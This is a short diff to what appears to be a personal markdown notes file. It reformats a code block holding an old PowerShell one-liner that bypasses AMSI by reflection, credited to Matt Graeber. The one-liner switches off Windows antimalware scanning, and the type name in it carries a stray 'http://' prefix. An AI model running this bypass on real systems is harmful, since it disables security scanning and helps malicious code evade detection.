@@ -2,7 +2,9 @@
 
 ### matty graeber I think it was:
 
-````[Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)````
+````
+[Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+````
 
 and old school AMSI bypass by reflection recorded here for posterity. 
 
